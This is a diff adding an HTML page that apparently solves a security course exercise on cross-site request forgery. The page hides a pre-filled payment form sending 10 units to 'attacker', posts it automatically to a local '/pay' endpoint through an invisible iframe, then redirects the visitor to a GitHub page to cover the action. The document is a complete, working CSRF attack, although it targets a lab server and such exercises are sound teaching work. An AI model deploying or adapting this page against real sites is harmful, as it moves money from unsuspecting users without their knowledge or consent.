@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+<style>
+iframe{visibility: hidden}
+form{visibility:hidden}
+h3{visibility:hidden}
+</style>
+
+<iframe src="http://localhost:8081/csrf" name="csrf"></iframe>
+<div class="payment-form">
+  <h3 class="payment-header">Make payment?</h3>
+  <form name = "CSRFpay" action="http://localhost:8080/pay" method="post" target="csrf">
+    <div class="form-group">
+      <div class="form-label">To:</div>
+      <div class="form-input"><input name="recipient" value="attacker" type="text" /></div>
+    </div>
+    <div class="form-group">
+      <div class="form-label">Amount:</div>
+      <div class="form-input"><input name="amount" value = "10" type="number" /></div>
+    </div>
+    <input class="form-button" type="submit" value="Pay"/>
+  </form>
+
+<script>
+document.forms.CSRFpay.submit();
+
+function redirect(){
+window.location.assign("http://github.com/tomrist/cs5435-fall2019");
+}
+
+window.addEventListener("load",redirect);
+</script>
+
+</body>
+
+</html>
